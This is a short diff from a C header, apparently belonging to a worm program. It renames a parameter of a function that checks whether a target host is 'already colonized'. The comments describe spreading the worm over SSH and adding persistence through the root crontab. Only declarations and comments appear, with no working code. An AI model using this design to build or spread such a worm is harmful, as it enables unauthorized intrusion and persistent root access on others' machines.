@@ -33,7 +33,7 @@
  /*
  * Check if the target host is already colonized (check if the worm exists on the target host)
  */
- bool isAlreadyColonized(char *host, char *programName, char *ssh, int portSSH, char *targetPath);
+ bool isAlreadyColonized(char *host, char *programName, char *ssh, int portSSH, char *dstDir);
 
  /*
  * Colinize a target host (copy the worm, the configuration file and update the root crontab)
